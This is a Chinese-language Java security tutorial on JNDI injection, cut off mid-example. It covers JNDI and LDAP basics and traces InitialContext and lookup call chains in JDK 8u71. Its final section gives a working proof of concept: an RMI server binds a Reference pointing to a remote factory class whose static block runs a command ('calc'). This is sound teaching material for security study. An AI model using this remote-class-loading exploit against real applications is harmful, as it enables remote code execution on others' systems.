# 漏洞篇 - JNDI 注入详解
> 2024-09-06
> 来源：https://changeyourway.github.io/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/

## JNDI 基础

JNDI 全称为 **Java Naming and Directory Interface**，即 Java 名称与目录接口。JNDI 提供了一种统一的接口来访问不同的命名和目录服务。它被广泛应用于企业级 Java 应用程序中，用于查找和访问各种资源，如数据库连接、EJB（Enterprise JavaBeans）组件、消息队列、环境变量等。

那么提到命名和目录服务，就有一些名词需要了解一下。

### 命名服务（Naming Service）

所谓命名服务，就是通过名称查找实际对象的服务。比如：

-   DNS：通过域名查找实际的 IP 地址；
-   文件系统：通过文件名定位到具体的文件；

在命名服务中有一些重要的概念：

-   **Bindings**：表示一个名称和对应对象的绑定关系。
-   **Context**：上下文，它是一个容器，代表了一个命名空间或环境，用户可以在其中查找、绑定和管理名字与对象之间的关联。
-   **References**：引用，它用于表示某个名字所对应的对象的“指针”或“引用路径”。通过引用，命名服务能够提供对对象的间接访问，而不是直接返回对象本身。

### 目录服务（Directory Service）

目录服务（Directory Service）是一个扩展了命名服务功能的服务，它不仅能够将名字映射到对象，还能为这些对象提供与之关联的属性（Attributes）。目录服务在管理和查找分布式资源时非常有用，特别是在企业级应用中。

#### JNDI 中的目录服务实现

JNDI 本身只是一个 API ，具体的目录服务由底层的实现提供。常见的 JNDI 目录服务实现包括：

-   LDAP (Lightweight Directory Access Protocol)：轻量级目录访问协议，最常用的目录服务协议，广泛用于企业中的用户和权限管理。
-   DNS (Domain Name System)：尽管主要是一个命名服务，DNS 也可以作为目录服务的一部分来处理一些资源记录。
-   NIS (Network Information Service)：主要用于 Unix/Linux 系统中的网络信息管理。
-   RMI 注册表 (RMI Registry)：在 Java RMI 中，JNDI 可以与 RMI 注册表集成，提供分布式对象的目录服务。

### JNDI API 和 SPI

JNDI（Java Naming and Directory Interface）包含两个主要部分：API（应用程序接口）和SPI（服务提供者接口）。如图：

![](https://changeyourway.github.io/images/1724813922373.png)

这两个部分分别定义了如何使用 JNDI 以及如何实现 JNDI 服务。

###### JNDI API

JNDI API (Application Programming Interface) 是面向应用程序开发者的接口，提供了一组标准的方法和类，使开发者能够通过统一的方式访问不同的命名和目录服务。它隐藏了底层服务的具体实现，提供了一种抽象层，使得开发者无需关心具体的服务提供者如何实现这些功能。

JNDI API 提供了以下主要功能：

-   命名操作：允许查找、绑定、重新绑定和取消绑定对象。基本操作包括：
    -   `Context.lookup(String name)`：查找一个对象。
    -   `Context.bind(String name, Object obj)`：将一个名字绑定到一个对象。
    -   `Context.rebind(String name, Object obj)`：重新绑定一个名字到一个新对象。
    -   `Context.unbind(String name)`：从命名空间中解除名字与对象的绑定。
-   目录操作：允许在对象中添加、删除、修改属性，以及查询对象的属性。主要操作包括：
    -   `DirContext.getAttributes(String name)`：获取对象的属性。
    -   `DirContext.modifyAttributes(String name, int mod_op, Attributes attrs)`：修改对象的属性。
    -   `DirContext.search(String name, String filter, SearchControls cons)`：根据过滤条件搜索对象。

以下是一个简单的 JNDI API 使用示例：

```
// 创建JNDI环境
Hashtable<String, String> env = new Hashtable<>();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:389");

// 获取初始上下文
Context ctx = new InitialContext(env);

// 查找对象
Object obj = ctx.lookup("cn=example,dc=example,dc=com");
System.out.println("Found object: " + obj);

// 关闭上下文
ctx.close();
```

###### JNDI SPI

JNDI SPI (Service Provider Interface) 是面向服务提供者的接口，定义了如何实现 JNDI API 的底层功能。服务提供者需要实现这些接口，以便 JNDI API 能够与实际的命名和目录服务进行交互。

JNDI SPI 定义了各种底层操作的实现方式，服务提供者需要提供这些操作的具体实现。主要包括：

-   **命名服务提供者接口**：服务提供者需要实现 `javax.naming.spi.NamingManager` 类和相关接口，提供命名操作的具体实现。
-   **目录服务提供者接口**：服务提供者需要实现 `javax.naming.spi.DirContext` 及其子类，提供目录操作的实现。

用途：

-   **服务集成**：SPI 允许不同的命名和目录服务集成到 JNDI 中，使得 JNDI 能够支持多种服务（如 LDAP 、DNS 、RMI 等）。通过实现 SPI ，服务提供者可以将特定的命名和目录服务功能暴露给 JNDI API 。
-   **扩展性**：通过 SPI ，JNDI 框架能够扩展，以支持新的命名和目录服务，而不需要修改 JNDI API 。

以下是一个简单的 SPI 实现示例： 假设我们要实现一个简单的命名服务提供者，需要实现 `javax.naming.spi.InitialContextFactory` 接口：

```
public class MyInitialContextFactory implements InitialContextFactory {

    @Override
    public Context getInitialContext(Hashtable<?, ?> environment) throws NamingException {
        return new MyContext(environment);
    }
}

// 自定义的Context实现
class MyContext implements Context {
    private Hashtable<?, ?> environment;

    public MyContext(Hashtable<?, ?> environment) {
        this.environment = environment;
    }

    @Override
    public Object lookup(String name) throws NamingException {
        // 自定义查找逻辑
        return "Looked up object for " + name;
    }

    // 其他Context接口方法的实现...
}
```

###### JNDI API 和 SPI 的关系

-   **API 使用 SPI**：JNDI API 提供了应用程序访问命名和目录服务的方法，但这些方法的具体实现依赖于底层的 SPI 。SPI 由具体的服务提供者实现，并通过 API 暴露给应用程序。
-   **分离实现与使用**：API 和 SPI 的分离设计使得 JNDI 具有高度的灵活性和可扩展性。应用程序可以使用统一的 API 与不同的服务交互，而不同的服务提供者可以通过实现 SPI 集成到 JNDI 框架中。

**总结**

-   JNDI API 是开发者与命名和目录服务交互的入口，提供了高层次的抽象接口。
-   JNDI SPI 则是底层服务提供者实现 API 所需功能的接口，确保 JNDI 能够支持多种不同的命名和目录服务。

## JNDI 入门案例

那么首先来实现一个利用 JNDI 接口调用 RMI 的入门案例。

RMI 服务端：

```
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws IOException, AlreadyBoundException, InterruptedException {
        // 将 SayHello 服务转换为 RMI 远程服务接口
        SayHelloInterface skeleton = new SayHelloImpl();
        // 将 RMI 服务注册到 1099 端口
        Registry registry = LocateRegistry.createRegistry(1099);
        // 注册 SayHello 服务，服务名为 "SayHello"
        registry.rebind("SayHello", skeleton);
    }
}
```

接口 SayHelloInterface ：

```
public interface SayHelloInterface extends Remote {
    String function(String input) throws IOException;
}
```

实现类：

```
import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class SayHelloImpl extends UnicastRemoteObject implements SayHelloInterface  {
    protected SayHelloImpl() throws RemoteException {
    }

    @Override
    public String function(String input) throws RemoteException, IOException {
        return input;
    }
}
```

JNDI 客户端：

```
import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class Client {
    public static void main(String[] args) throws Exception {

        //设置JNDI环境变量
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        //初始化上下文
        Context initialContext = new InitialContext(env);
        //调用远程类
        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup("SayHello");
        System.out.println(sayhello.function("test"));

    }
}
```

运行结果：

![](https://changeyourway.github.io/images/QQ_1725023949201.png)

那么从上面的案例可以看出，要想使用 JNDI 接口调用 RMI ，只需要把原来的 Registry 对象换成 JNDI 的 Context 上下文对象即可，利用这个上下文对象来统一调度各种命名与目录服务。

前面在举 JNDI API 使用示例的时候，调用的是 LDAP 服务，可以看到也是先获取了 Context 上下文对象。

那么 Context 上下文对象是如何判断具体调用哪一种服务的呢？

在获取 Context 对象时调用了 InitialContext 构造方法，传入了一个 Hashtable 对象，在这个对象中设置了两个键，分别是 INITIAL\_CONTEXT\_FACTORY 和 PROVIDER\_URL ，它们就分别代表了要调用的服务和服务器的地址。

## JNDI 源码分析

环境为 JDK 8u71 。

### 初始化上下文

在 new InitialContext 处下断点：

![](https://changeyourway.github.io/images/QQ_1725025107716.png)

跟进 InitialContext 的构造方法一探究竟：

![](https://changeyourway.github.io/images/QQ_1725025185797.png)

这里首先是调用 environment.clone() ，Hashtable 类的 clone 方法用于创建一个 Hashtable 对象的浅拷贝。浅拷贝意味着它会引用原始 Hashtable 中的键值对，但不会复制这些键值对本身所引用的对象。也就是说新拷贝的 Hashtable 将包含与原始 Hashtable 相同的键和相同的值的引用，但这些值是与原 Hashtable 中的相同对象共享的。

然后调用了 InitialContext 的 init 方法，跟进它：

![](https://changeyourway.github.io/images/QQ_1725025394196.png)

这里先是调用 ResourceManager.getInitialEnvironment 方法。

###### ResourceManager#getInitialEnvironment

这个方法通过合并多种来源（包括用户提供的环境设置、系统属性、Applet 参数和应用资源文件）来构建最终的环境 Hashtable 。

跟进 ResourceManager.getInitialEnvironment 方法看看：

![](https://changeyourway.github.io/images/QQ_1725075439737.png)

首先是创建了一个 props 数组，这个数组中包含了很多与命名服务相关的属性：

![](https://changeyourway.github.io/images/QQ_1725075493848.png)

然后判断 env 是否存在，没有就创建。因为我们传入了一个 env 对象，所以不创建。

接着从 env 中获取 Context.APPLET 键的值，因为我们一开始并没有设置，自然获取到空值：

![](https://changeyourway.github.io/images/QQ_1725075668483.png)

再往下看：

![](https://changeyourway.github.io/images/QQ_1725075703930.png)

这里首先是利用 helper.getJndiProperties 从系统属性中获取与 JNDI 相关的属性值，但是我并没有设置系统属性，所以获取到空值：

![](https://changeyourway.github.io/images/QQ_1725077490189.png) ![](https://changeyourway.github.io/images/QQ_1725076041307.png)

接下也是最为关键的一步，循环遍历，将 props 数组中的所有值作为键去获取对应的值。首先是从 env 中找，如果 env 没有就再去 applet 中找，如果还是没有就再去 jndiSysProps 中找。所以这里就找了传入的值、Applet 参数和系统属性，将找到的结果全部注入到 env 中。

方法的最后就是判断有没有开启应用资源文件，如果允许的话，就再从应用资源文件中找一遍。如果不允许，就直接返回 env ：

![](https://changeyourway.github.io/images/QQ_1725076491813.png)

因为我只设置了 env ，所以最后返回的结果跟传入的参数一模一样：

![](https://changeyourway.github.io/images/QQ_1725076806822.png)

###### 设置系统属性来初始化上下文

由此也可以知道，除了设置 Hashtable 对象外，还可以通过设置系统属性来初始化上下文。

```
public class Client {
    public static void main(String[] args) throws Exception {
		// 设置系统属性
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://localhost:1099");
		// 初始化上下文
        Context initialContext = new InitialContext();
        //调用远程类
        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup("SayHello");
        System.out.println(sayhello.function("test"));

    }
}
```

这样在调用 helper.getJndiProperties 获取系统属性时获取到的将不再是空值：

![](https://changeyourway.github.io/images/QQ_1725077562018.png)

那么 ResourceManager.getInitialEnvironment 就分析完了。

回到 init 方法，我们继续看 getDefaultInitCtx 方法：

![](https://changeyourway.github.io/images/%7B842EB5FD-7EDE-4D50-86CB-882140458A4C%7D)

###### InitialContext#getDefaultInitCtx

跟进 InitialContext#getDefaultInitCtx 看看：

![](https://changeyourway.github.io/images/QQ_1725083853814.png)

###### NamingManager#getInitialContext

这里只是调用了 NamingManager.getInitialContext ，跟进它：

![](https://changeyourway.github.io/images/image-20240831140627510.png)

NamingManager.getInitialContext 首先调用了 getInitialContextFactoryBuilder 获取了一个 InitialContextFactoryBuilder 对象。

![](https://changeyourway.github.io/images/QQ_1725084482734.png)

这个方法没什么可看的，最后获取到的 builder 为空：

![](https://changeyourway.github.io/images/QQ_1725084515607.png)

进入 builder 为空的判断，随后获取了 env 中的 Context.INITIAL\_CONTEXT\_FACTORY 属性值，也就是我们一开始设置的那个属性值：

![](https://changeyourway.github.io/images/QQ_1725084638437.png)

显然不为空，那么不会报出异常。

继续往下：

![](https://changeyourway.github.io/images/QQ_1725084720549.png)

先是实例化了一下 RegistryContextFactory 类：

![](https://changeyourway.github.io/images/QQ_1725085639878.png)

正确传入了 className 那么实例化没有问题。

builder 为空，所以 builder.createInitialContextFactory 不会被调用。

最后调用 factory.getInitialContext 方法，也就是 RegistryContextFactory 的 getInitialContext 方法。

###### RegistryContextFactory#getInitialContext

跟进 RegistryContextFactory 的 getInitialContext 方法：

![](https://changeyourway.github.io/images/QQ_1725085874130.png)

var1 是传入的 Hashtable 对象 env ，自然是不为空的。这里创建 var1 的引用。

先调用 getInitCtxURL 方法获取了环境变量中的 java.naming.provider.url 属性，也即 “rmi://localhost:1099” 字符串返回：

![](https://changeyourway.github.io/images/QQ_1725086036739.png)

然后调用 URLToContext 方法将参数传入，跟进 RegistryContextFactory 的 URLToContext 方法：

![](https://changeyourway.github.io/images/QQ_1725086448932.png)

这里的核心是利用 rmiURLContextFactory 的构造方法获取一个 rmiURLContextFactory 对象，利用这个工厂对象获取 Context 对象并返回。

rmiURLContextFactory 构造方法什么也没写：

![](https://changeyourway.github.io/images/QQ_1725086841824.png)

那就接着看 rmiURLContextFactory 的 getObjectInstance 方法：

![](https://changeyourway.github.io/images/QQ_1725086970746.png)

var1 是有值的，而且是 String 类型，所以调用 getUsingURL 处理。

跟进 rmiURLContextFactory 的 getUsingURL 方法：

![](https://changeyourway.github.io/images/QQ_1725087125013.png)

这里获取到的 var2 是 rmiURLContext 对象，其中依然封装着环境变量：

![](https://changeyourway.github.io/images/QQ_1725087363188.png)

接下来便会调用 rmiURLContext 的父类 GenericURLContext 的 lookup 方法。

###### GenericURLContext#lookup

跟进 GenericURLContext 的 lookup 方法：

![](https://changeyourway.github.io/images/QQ_1725087523333.png)

跟进 GenericURLContext 的 getRootURLContext 方法：

GenericURLContext 的 getRootURLContext 方法做了大量的字符串处理，在方法的最后调用了 RegistryContext 的构造方法：

![](https://changeyourway.github.io/images/QQ_1725088276107.png)

来看 RegistryContext 的构造方法：

![](https://changeyourway.github.io/images/QQ_1725088849863.png)

最后调用 RegistryContext 的 getRegistry 方法获取了一个 RegistryImpl\_Stub 对象：

![](https://changeyourway.github.io/images/QQ_1725089041622.png)

RegistryContext 的 getRegistry 方法毫不意外是用 LocateRegistry.getRegistry 方法获取对象，与 RMI 一样：

![](https://changeyourway.github.io/images/QQ_1725089107722.png)

好，那么回到 GenericURLContext 的 lookup 方法，此时 getRootURLContext 已经调用完毕，获取到的 var2 有两个属性 resolvedObj 和 remainingName：

![](https://changeyourway.github.io/images/QQ_1725089500131.png)

那么 var3 获取到的自然是 RegistryContext 对象，调用 RegistryContext 的 lookup 方法。

RegistryContext 的 lookup 方法：

![](https://changeyourway.github.io/images/QQ_1725089711617.png)

也是毫不意外地调用了 this.registry.lookup 方法，也即 RegistryImpl\_Stub 的 lookup 方法。

至于这里为什么要调用 lookup 方法，是这样的：getRootURLContext 方法的返回值不是有两个属性嘛，一个 resolvedObj ，一个 remainingName ：

![](https://changeyourway.github.io/images/QQ_1725103006128.png)

resolvedObj 代表的含义就是已解析的对象（即部分路径对应的上下文对象），而 remainingName 表示尚未解析的路径部分，那么这里调用 lookup 方法就是为了完成对剩余路径部分的解析，利用已经获取的上下文对象 RegistryImpl\_Stub 来获取剩余路径所指代的对象。就好比说先获取 DNS 的顶级域名，再从顶级域名中获取二级域名嘛。

JNDI 的命名系统通常是分层次的，每层可能由不同的命名上下文负责。例如，在一个典型的 URL 路径中，前面的一部分路径可能已经解析到一个特定的上下文对象，但后面的一部分路径仍需要进一步解析。

至此，我们就完成了对上下文对象的初始化，获取到了 Context 对象。

###### 调用链总结

以调用 RMI 服务为例，总结一下调用链，用 -> 表示同一个方法中的不同分支：

```
InitialContext#InitialContext(Hashtable<?,?>)
InitialContext#init(Hashtable<?,?>)
	-> ResourceManager#getInitialEnvironment(Hashtable<?, ?>) # 获取环境变量
	-> InitialContext#getDefaultInitCtx()
	   NamingManager#getInitialContext(Hashtable<?,?>)
	   RegistryContextFactory#getInitialContext(Hashtable<?, ?>)
	   RegistryContextFactory#URLToContext(String, Hashtable<?, ?>)
	   rmiURLContextFactory#getObjectInstance(Object, Name, Context, Hashtable<?, ?>)
	   rmiURLContextFactory#getUsingURL(String, Hashtable<?, ?>)
	   GenericURLContext#lookup(String)
	   -> rmiURLContext#getRootURLContext(String, Hashtable<?, ?>)
	      RegistryContext#RegistryContext(String, int, Hashtable<?, ?>)
	      RegistryContext#getRegistry(String, int, RMIClientSocketFactory)
	      LocateRegistry#getRegistry(String, int) # 获取 RegistryImpl_Stub 对象 
	   -> RegistryContext#lookup(Name)
	      RegistryImpl_Stub#lookup(String) # 进一步解析剩余路径
```

### 查找远程对象

跟进 initialContext.lookup 方法：

![](https://changeyourway.github.io/images/QQ_1725106323011.png)

这里是先调用 getURLOrDefaultInitCtx 方法获取一个对象，然后再调用该对象的 lookup 方法。

跟进 InitialContext 的 getURLOrDefaultInitCtx 方法：

![](https://changeyourway.github.io/images/QQ_1725106511808.png)

第一步调用 NamingManager.hasInitialContextFactoryBuilder 检查是否已经存在一个初始上下文工厂构建器，这一步是没有的，不进入判断。

继续往下，调用 getURLScheme 提取传入字符串的 URL 链接开头部分，比如 “rmi”，”ldap” ：

![](https://changeyourway.github.io/images/QQ_1725106983919.png)

因为字符串并不包含 URL 部分，所以这里返回空。

既然返回空值的话，就不会进入判断了，最后调用 getDefaultInitCtx 方法并返回。

跟进 InitialContext 的 getDefaultInitCtx 方法：

![](https://changeyourway.github.io/images/QQ_1725107374037.png)

这个方法先前在初始化上下文的时候已经进入过一次，将 gotDefault 设置为 true ，所以直接返回。

这里的 defaultInitCtx 是 RegistryContext 对象：

![](https://changeyourway.github.io/images/QQ_1725109973809.png)

所以返回后就进入 RegistryContext 的 lookup 方法：

![](https://changeyourway.github.io/images/QQ_1725110084570.png)

这里就继续调用了 RegistryContext#lookup(Name) 方法，跟进它：

![](https://changeyourway.github.io/images/QQ_1725110150913.png)

之后的路子就熟了，依然是调用 RegistryImpl\_Stub 的 lookup 方法。

###### 调用链总结

```
initialContext#lookup(String)
	-> initialContext#getURLOrDefaultInitCtx(String)
        -> initialContext#getURLScheme(String) # 获取协议部分
           NamingManager#getURLContext(String, Hashtable<?,?>)
        -> initialContext#getDefaultInitCtx() # 获取 RegistryContext 对象
    -> RegistryContext#lookup(String)
       RegistryContext#lookup(Name)
       RegistryImpl_Stub#lookup(Name) # 查找远程对象
```

### JNDI 动态协议转换

###### 代码示例

事实上，在查找远程对象的时候，可以直接传入完整的 URL 链接，这样它会自动调用对应的协议，请求对应的地址，而不需要再手动设置属性，客户端代码如下：

```
public class Client {
    public static void main(String[] args) throws Exception {
        //初始化上下文
        Context initialContext = new InitialContext();
        //调用远程类
        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup("rmi://127.0.0.1:1099/SayHello");
        System.out.println(sayhello.function("test"));

    }
}
```

显然这是一种更简便的 JNDI 调用方式。

###### 源码分析

在查找远程对象时，通过 InitialContext 的 getURLScheme 方法就能提取出其中的协议部分：

![](https://changeyourway.github.io/images/QQ_1725107852805.png)

这时获取到的 scheme 就是字符串 “rmi” 。

随后调用 NamingManager.getURLContext 方法，跟进它：

![](https://changeyourway.github.io/images/QQ_1725108263515.png)

调用 NamingManager 的 getURLObject 方法，继续跟进：

![](https://changeyourway.github.io/images/QQ_1725109108360.png)

最核心的就是通过 ResourceManager.getFactory 方法获取一个工厂类对象，这里获取的对象是由传入的 scheme 决定的，对象的类名就是 scheme + “URLContextFactory” ，那么这里获取到的是 rmiURLContextFactory 对象。

最后调用 factory.getObjectInstance 获取了一个 rmiURLContext 对象并将其返回：

![](https://changeyourway.github.io/images/QQ_1725109173862.png)

那么回到 InitialContext 的 getURLOrDefaultInitCtx 方法，最后返回的就是这个 rmiURLContext 对象：

![](https://changeyourway.github.io/images/QQ_1725109284349.png)

所以之后调用的是 rmiURLContext 的 lookup 方法：

![](https://changeyourway.github.io/images/QQ_1725109301609.png)

然而 rmiURLContext 并没有重写 lookup 方法，所以调用的是父类 GenericURLContext 的 lookup 方法。

后续的流程跟前面是一样的。

###### 调用链总结

```
initialContext#lookup(String)
	-> initialContext#getURLOrDefaultInitCtx(String)
       -> initialContext#getURLScheme(String) # 获取协议部分
       -> NamingManager#getURLContext(String, Hashtable<?,?>)
          NamingManager#getURLObject(String, Object, Name, Context, Hashtable<?,?>)
          ResourceManager#getFactory(String, Hashtable<?,?>, Context, String, String)
          rmiURLContextFactory#getObjectInstance(Object, Name, Context, Hashtable<?, ?>)
          rmiURLContext#rmiURLContext(Hashtable<?, ?>) # 获取 rmiURLContext 对象
    -> GenericURLContext#lookup(String)
       -> rmiURLContext#getRootURLContext(String, Hashtable<?, ?>)
	      RegistryContext#RegistryContext(String, int, Hashtable<?, ?>)
	      RegistryContext#getRegistry(String, int, RMIClientSocketFactory)
	      LocateRegistry#getRegistry(String, int) # 获取 RegistryImpl_Stub 对象 
	   -> RegistryContext#lookup(Name)
	      -> RegistryImpl_Stub#lookup(String) # 获取远程对象
	      -> RegistryContext#decodeObject(Remote, Name)
	         NamingManager#getObjectInstance(Object, Name, Context, Hashtable<?,?>) # 实例化远程对象
```

## JNDI Reference 类

在 JNDI 中，Reference 类用于表示对那些不直接存储在命名或目录系统中的对象的引用。也就是说，当对象本身无法被序列化并存储在目录中时，Reference 提供了一种方式，通过包含足够的信息以便在需要时重新构建该对象。

例如，当你通过 RMI（远程方法调用）获取一个远程服务上的对象时，客户端实际上得到的是一个对象的存根（stub）。这个对象本身可能并不直接存在于客户端的命名或目录系统中，但通过 Reference ，客户端可以包含必要的信息，从其他服务器加载类文件并实例化对象。

Reference 类位于 javax.naming 包中，主要有以下几个构造方法：

```
public Reference(String className, String factory, String factoryLocation)
public Reference(String className)
public Reference(String className, Vector<RefAddr> addrs, String factory, String factoryLocation)
```

参数解释：

1.  类名（Class Name）：指定了引用的对象的完全限定类名。它告诉 JNDI 在实例化对象时需要加载哪个类。
2.  工厂类名（Factory Class Name）：指定了用于重新构建对象的工厂类。这个工厂类必须实现 javax.naming.spi.ObjectFactory 接口。
3.  地址列表（Address List）：包含了一组 RefAddr（引用地址），这些地址携带了重建对象所需的各种信息。常见的 RefAddr 子类包括 StringRefAddr 、SerialRefAddr 等。

## LDAP 协议

LDAP（Lightweight Directory Access Protocol，轻量级目录访问协议）是一种应用层协议，用于访问和维护分布式目录信息服务，其默认端口是 389 。LDAP 广泛应用于目录服务中，用于查询和管理用户、设备、应用程序等信息。LDAP 通常用于验证用户身份，并存储与组织、用户及其他资源相关的详细信息。

###### LDAP 协议的基本概念

1.  **目录服务**: 目录服务是一个存储和组织数据的分层结构，类似于文件系统中的目录结构。它存储有关用户、计算机、网络资源等的信息，并允许用户和应用程序通过 LDAP 协议来查询和管理这些信息。
    
2.  **条目（Entry）**: LDAP 目录中的基本数据单位，每个条目由一组属性及其对应的值组成。每个条目都有一个唯一的区分名称（Distinguished Name, DN），用来唯一标识条目在目录树中的位置。
    
3.  **区分名称（DN）**: DN 是 LDAP 中条目的唯一标识符。它类似于文件路径，包含了从根到条目的所有层次信息。DN 由多个相对区分名称（RDN, Relative Distinguished Name）组成。
    
    例如，“uid=john.doe” 表示由名为 “uid” 且值为 “john.doe” 的属性组成的 RDN 。如果 RDN 有多个属性值对，则用加号分隔，例如 “givenName=John+sn=Doe” ；
    
    一个 DN 通常由多个 RDN 组成，例如，DN “uid=john.doe,ou=People,dc=example,dc=com” 有四个 RDN ；
    
    右边的范围比左边的范围大，左边的 RDN 是右边 RDN 的子集，例如，DN “uid=john.doe,ou=People,dc=example,dc=com” 的父 DN 为 “ou=People,dc=example,dc=com” 。
    
4.  **属性（Attribute）**: 每个条目由若干属性组成，属性包含属性类型和属性值。例如，cn（common name, 通用名）、mail（电子邮件地址）、uid（用户ID）等都是属性类型，属性值则是对应的实际数据。
    
5.  **对象类（Object Class）**: 每个 LDAP 条目都有一个或多个对象类，定义了条目中允许出现的属性类型。对象类决定了条目的结构和内容。常见的对象类包括 inetOrgPerson 、organizationalUnit 等。
    

###### LDAP 数据模型

LDAP 采用树状结构（即目录信息树，DIT）来组织和存储数据。树的每个节点代表一个条目，条目之间的层次关系由它们的DN来表示。例如：

```
dc=example,dc=com
├── ou=People
│   ├── cn=John Doe
│   ├── cn=Jane Smith
├── ou=Groups
│   ├── cn=Admins
```

-   `dc=example,dc=com`：目录的根条目，`dc` 表示域组件（Domain Component）。
-   `ou=People`：表示一个组织单元（Organizational Unit），用于存放用户信息。
-   `cn=John Doe`：表示用户 “John Doe” 的条目，`cn` 表示通用名（Common Name）。

###### LDAP 协议操作

LDAP 协议定义了多个操作来查询和管理目录中的条目。主要操作包括：

1.  **绑定（Bind）**: 客户端与 LDAP 服务器建立连接并进行身份验证。绑定操作可以是匿名的，也可以使用用户名和密码进行身份验证。
2.  **搜索（Search）**: 客户端可以在目录中搜索特定的条目，搜索操作可以通过指定 DN 、搜索范围、过滤条件等来精确查找。
3.  **比较（Compare）**: 比较操作用于检查某个条目中的某个属性值是否与给定值匹配。
4.  **添加（Add）**: 向目录中添加新的条目。
5.  **删除（Delete）**: 删除指定的条目。
6.  **修改（Modify）**: 修改条目的属性，可以添加、删除或替换属性值。
7.  **修改 DN（Modify DN）**: 改变条目的 DN ，从而改变条目在目录树中的位置。
8.  **解除绑定（Unbind）**: 客户端通知 LDAP 服务器终止会话，关闭连接。

###### LDAP 报文结构

LDAP 协议是基于 TCP/IP 的，其消息结构通常使用 BER（Basic Encoding Rules）编码。下面是 LDAP 请求和响应消息中的一些主要字段：

1.  **消息 ID**：每个 LDAP 消息都有一个唯一的消息 ID ，用于在请求和响应之间进行匹配。
2.  **操作代码**：指示 LDAP 消息的类型，例如 `BindRequest`、`SearchRequest`、`ModifyRequest` 等。
3.  **DN（Distinguished Name）**：用于指定操作所作用的目标条目。
4.  **属性和值**：用于指定要查询、添加、修改或删除的属性及其值。
5.  **搜索范围**：用于指定搜索操作的范围，如 `base` 、`oneLevel` 、`subtree` 。
6.  **过滤器（Filter）**：在搜索操作中使用的过滤条件，用于限定搜索结果，例如 `(cn=John Doe)` 表示查询 `cn` 属性等于 “John Doe” 的条目。
7.  **结果代码（Result Code）**：LDAP响应消息中的结果代码，用于表示操作的结果，如 `success`（成功）、`noSuchObject`（无此对象）、`invalidCredentials`（凭证无效）等。

###### LDAP 主要字段含义

以下是 LDAP 消息中常见字段的含义：

-   **messageID**：区分每个 LDAP 操作的标识符，确保请求和响应能够正确对应。
-   **protocolOp**：指示 LDAP 操作类型，如 `bindRequest`、`searchRequest` 等。
-   **dn**：目标条目的 DN 。
-   **attributes**：在 LDAP 操作中，定义要添加、修改、删除或查询的属性名称和属性值。
-   **filter**：在 `searchRequest` 中定义的过滤器，用于指定搜索的条件。
-   **resultCode**：操作结果的状态码，标示操作成功或失败的类型。

比如一个请求消息：

```
LDAPMessage {
    messageID: 1
    protocolOp: bindRequest {
        version: 3
        name: "cn=admin,dc=example,dc=com"
        authentication: simple {
            credentials: "admin_password"
        }
    }
}
```

对应的响应信息：

```
LDAPMessage {
    messageID: 1
    protocolOp: bindResponse {
        resultCode: success (0)
        matchedDN: ""
        diagnosticMessage: ""
    }
}
```

###### 总结

LDAP 是一种用于访问和管理目录服务的协议。它通过一系列操作来允许客户端查询和管理目录中的条目，每个条目由一组属性组成，并使用 DN 进行唯一标识。LDAP 协议的灵活性和广泛应用使其成为身份验证、访问控制等领域的标准协议之一。

## JNDI 注入

JNDI 注入的前提是能操作客户端 lookup 方法或其他远程操作方法的参数。

### JNDI + RMI

实现方法很简单，我们先在 RMI 服务器上绑定一个 Reference 类，服务端代码如下：

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JndiRmiTest {
    public static void main(String[] args) throws IOException, AlreadyBoundException, InterruptedException, NamingException {
        // 创建一个 Reference 对象
        Reference reference = new Reference("EvilClass", "EvilClass", "http://127.0.0.1:8002/");
        // 用 ReferenceWrapper 包装 Reference 对象，使其继承 UnicastRemoteObject 类
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        // 将 RMI 服务注册到 1099 端口
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定 Reference 对象
        registry.rebind("EvilClass", referenceWrapper);
    }
}
```

前面说了 Reference 构造方法的三个参数，那么就知道这个 EvilClass 就是 Reference 中指定的远程类名，EvilClass 同时也作为工厂类名，所以它要实现 javax.naming.spi.ObjectFactory 接口。EvilClass 代码如下：

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class EvilClass implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

此外我们知道，要在 RMI 服务上绑定远程对象，这个远程对象需要继承 UnicastRemoteObject 类，那么可以将 Reference 对象封装进 ReferenceWrapper 中，使其继承 UnicastRemoteObject 类，可以看一下 ReferenceWrapper 的定义：

![](https://changeyourway.github.io/images/image-20240903130853020.png)

需要注意的是：com.sun.jndi.rmi.registry.ReferenceWrapper 在新版本的 JDK 中被移除，需要额外引入对应 jar 包。这里的 JDK 版本为 8u71。

最后是客户端代码，只要去请求 RMI 服务端即可：

```
import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class Client {
    public static void main(String[] args) throws Exception {
		//初始化上下文
        Context initialContext = new InitialContext();
        //调用远程类
